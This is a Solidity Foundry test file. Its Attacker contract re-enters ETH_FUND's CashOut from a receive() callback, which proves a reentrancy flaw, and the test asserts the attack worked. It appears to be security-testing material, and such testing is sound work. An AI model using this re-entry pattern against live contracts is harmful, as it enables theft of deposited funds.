
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import "../src/ETH_FUND.sol";

contract TestReentrancyETH_FUND is Test {
    ETH_FUND public _contractUnderTest;
    Log public _log;
    Attacker public _attacker;

    function setUp() public {
        _log = new Log();
        _contractUnderTest = new ETH_FUND(address(_log));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        // --- 1. Constraints & Pitfall Avoidance ---
        // MinDeposit is 1 ether. We need to deposit more than that.
        vm.assume(attackVal > 2 ether);
        // Avoid overflow
        vm.assume(attackVal < type(uint128).max);

        // --- 2. State Configuration (Pre-Condition) ---
        // No specific state needed before setup, but we need to handle block timing later.

        // --- 3. Funding ---
        // Fund the Victim (so it has ETH to steal/withdraw)
        vm.deal(address(_contractUnderTest), attackVal); 
        
        // Fund the Test Contract (address(this))
        vm.deal(address(this), attackVal);

        // --- 4. Trigger Attack ---
        // We deposit 'attackVal'. Inside the attack, we will withdraw 'attackVal / 2' twice.
        _attacker.setupAttack{value: attackVal}(attackVal);
        
        // ETH_FUND requires block.number > lastBlock for CashOut.
        // Deposit updated lastBlock to current block. We must roll forward.
        vm.roll(block.number + 1);
        
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    ETH_FUND public victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public withdrawAmount;

    constructor(address victimAddress) { 
        victim = ETH_FUND(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        
        // Deposit the funds. This sets balances[this] = val.
        victim.Deposit{value: val}();
    }

    function attack(uint256 val) public {
        // We aim to withdraw half the deposited amount twice.
        // This proves we can re-enter the function before the balance is updated.
        // Note: In Solidity 0.8+, we cannot withdraw MORE than deposited because 
        // the subtraction 'balances[msg.sender] -= _am' would revert on underflow 
        // when the first call resumes. However, executing the logic twice successfully
        // proves the reentrancy vulnerability exists.
        withdrawAmount = val / 2;

        victim.CashOut(withdrawAmount);

        // Verify Success Conditions.
        if (attackCallCount >= 2) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            // Increment before calling to prevent infinite recursion loop in this test setup
            attackCallCount++;
            
            // Re-enter the contract
            victim.CashOut(withdrawAmount);
        }
    }
}
